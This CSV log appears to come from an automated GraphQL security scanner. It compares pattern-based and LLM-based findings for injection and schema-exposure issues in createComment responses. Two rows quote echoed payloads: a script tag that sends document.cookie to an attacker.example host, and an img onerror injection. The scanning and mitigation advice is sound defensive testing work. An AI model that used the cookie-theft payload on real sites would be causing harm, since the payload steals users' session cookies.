timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-05T21:42:01.460739,createComment_response_2,200,1,0,0.0,simple_only,,Injection Attacks,,0,1,0,0,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]",[]
2025-10-05T21:42:07.826153,createComment_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response contains an unescaped <script> element in the 'body' field returned by createComment. This indicates the server accepted and returned raw HTML/JavaScript content. If a client renders this 'body' value into the DOM without proper output encoding or sanitization, the embedded script would execute in the victim's browser and could exfiltrate cookies (as the payload itself attempts). Because the input appears to be stored and returned by createComment, this is indicative of a stored XSS risk (or reflected XSS depending on usage). Recommend treating the field as untrusted: apply output encoding/HTML-escaping before inserting into pages, perform input validation/sanitization, and deploy Content Security Policy (CSP) to mitigate script execution."", ""evidence"": ""\""body\"": \""<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>Attempt XSS\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""HIGH"", ""confidence"": 0.95, ""evidence"": ""\""body\"": \""<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>Attempt XSS\"""", ""explanation"": ""The GraphQL response contains an unescaped <script> element in the 'body' field returned by createComment. This indicates the server accepted and returned raw HTML/JavaScript content. If a client renders this 'body' value into the DOM without proper output encoding or sanitization, the embedded script would execute in the victim's browser and could exfiltrate cookies (as the payload itself attempts). Because the input appears to be stored and returned by createComment, this is indicative of a stored XSS risk (or reflected XSS depending on usage). Recommend treating the field as untrusted: apply output encoding/HTML-escaping before inserting into pages, perform input validation/sanitization, and deploy Content Security Policy (CSP) to mitigate script execution.""}}]"
2025-10-05T21:42:16.812797,createComment_response_4,200,1,0,0.0,simple_only,,Injection Attacks,,0,1,0,0,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Server-Side Request Forgery (SSRF) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SSRF injection vulnerability detected - internal network access patterns found"", ""evidence"": ""Response status: 200, SSRF keywords detected in response""}]",[]
2025-10-05T21:42:26.414066,createComment_response_5,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T21:42:34.450168,createComment_response_6,200,1,0,0.0,simple_only,,Injection Attacks,,0,1,0,0,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]",[]
2025-10-05T21:42:52.168066,createComment_response_7,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""HTML Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""HTML injection vulnerability detected - HTML markup found in response"", ""evidence"": ""Response status: 200, HTML patterns detected in response data""}]","[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response returns raw HTML markup including an inline event handler: an <img> tag with an onerror attribute that triggers JavaScript. That indicates the API accepted and is reflecting/storing HTML content without sanitization or escaping. If a client renders this field into the DOM using innerHTML or otherwise injects it as HTML, the onerror handler will execute, producing a stored/reflected XSS (HTML injection) risk. The JSON encoding itself does not neutralize the HTML for client-side rendering. Recommended mitigations: sanitize or strip HTML on input or output, encode/escape HTML before inserting into pages (or use textContent), and apply appropriate Content Security Policy and output-encoding practices."", ""evidence"": ""data.createComment.body = \""<img src=\\\""x\\\"" onerror=\\\""alert('injection')\\\"">Injected HTML content\"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""HIGH"", ""confidence"": 0.9, ""evidence"": ""data.createComment.body = \""<img src=\\\""x\\\"" onerror=\\\""alert('injection')\\\"">Injected HTML content\"""", ""explanation"": ""The GraphQL response returns raw HTML markup including an inline event handler: an <img> tag with an onerror attribute that triggers JavaScript. That indicates the API accepted and is reflecting/storing HTML content without sanitization or escaping. If a client renders this field into the DOM using innerHTML or otherwise injects it as HTML, the onerror handler will execute, producing a stored/reflected XSS (HTML injection) risk. The JSON encoding itself does not neutralize the HTML for client-side rendering. Recommended mitigations: sanitize or strip HTML on input or output, encode/escape HTML before inserting into pages (or use textContent), and apply appropriate Content Security Policy and output-encoding practices.""}}]"
2025-10-05T21:42:59.713985,createComment_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T21:43:05.982772,createComment_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T21:43:18.802853,createComment_response_10,400,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,0,0,1,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: Introspection (Schema Exposure)"", ""detection"": ""safe"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL error response leaks schema information by suggesting an existing field name ('comment') when an invalid field ('createComment') was queried. This behavior discloses available field names and thus reveals parts of the GraphQL schema (schema exposure/introspection via error messages). While this is not a full introspection query response, it still provides sensitive information that can help an attacker craft targeted queries. Recommended mitigations: remove or sanitize detailed GraphQL validation errors in production, disable or restrict introspection queries where possible, and require authentication/authorization for schema access or error detail."", ""evidence"": ""Error message: \""Cannot query field \\\""createComment\\\"" on type \\\""Query\\\"". Did you mean \\\""comment\\\""?\"""", ""confidence"": 0.85, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Introspection (Schema Exposure)"", ""severity"": ""LOW"", ""confidence"": 0.85, ""evidence"": ""Error message: \""Cannot query field \\\""createComment\\\"" on type \\\""Query\\\"". Did you mean \\\""comment\\\""?\"""", ""explanation"": ""The GraphQL error response leaks schema information by suggesting an existing field name ('comment') when an invalid field ('createComment') was queried. This behavior discloses available field names and thus reveals parts of the GraphQL schema (schema exposure/introspection via error messages). While this is not a full introspection query response, it still provides sensitive information that can help an attacker craft targeted queries. Recommended mitigations: remove or sanitize detailed GraphQL validation errors in production, disable or restrict introspection queries where possible, and require authentication/authorization for schema access or error detail.""}}]"
2025-10-05T21:43:29.359386,createComment_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Unknown,1,0,0,0,1,0,0.0,llm_potential_only,,,Unknown,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: field_suggestions"", ""detection"": ""potential"", ""category"": ""Unknown"", ""description"": ""The GraphQL error response includes a helpful suggestion ('Did you mean \""comment\""?') when an unknown field ('createComment') was queried. This behavior reveals schema information (available field names and types) which aids an attacker in enumerating the API schema and crafting targeted queries. While this is not direct data leakage like secrets or SQL errors, it is an information disclosure vulnerability (field suggestions) that increases the attack surface. Recommended mitigations: disable or remove suggestion text in error messages, return generic validation errors, or restrict error verbosity in production and require authenticated/introspected access for schema discovery."", ""evidence"": ""errors[0].message: \""Cannot query field \\\""createComment\\\"" on type \\\""Query\\\"". Did you mean \\\""comment\\\""?\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""field_suggestions"", ""severity"": ""MEDIUM"", ""confidence"": 0.95, ""evidence"": ""errors[0].message: \""Cannot query field \\\""createComment\\\"" on type \\\""Query\\\"". Did you mean \\\""comment\\\""?\"""", ""explanation"": ""The GraphQL error response includes a helpful suggestion ('Did you mean \""comment\""?') when an unknown field ('createComment') was queried. This behavior reveals schema information (available field names and types) which aids an attacker in enumerating the API schema and crafting targeted queries. While this is not direct data leakage like secrets or SQL errors, it is an information disclosure vulnerability (field suggestions) that increases the attack surface. Recommended mitigations: disable or remove suggestion text in error messages, return generic validation errors, or restrict error verbosity in production and require authenticated/introspected access for schema discovery.""}}]"
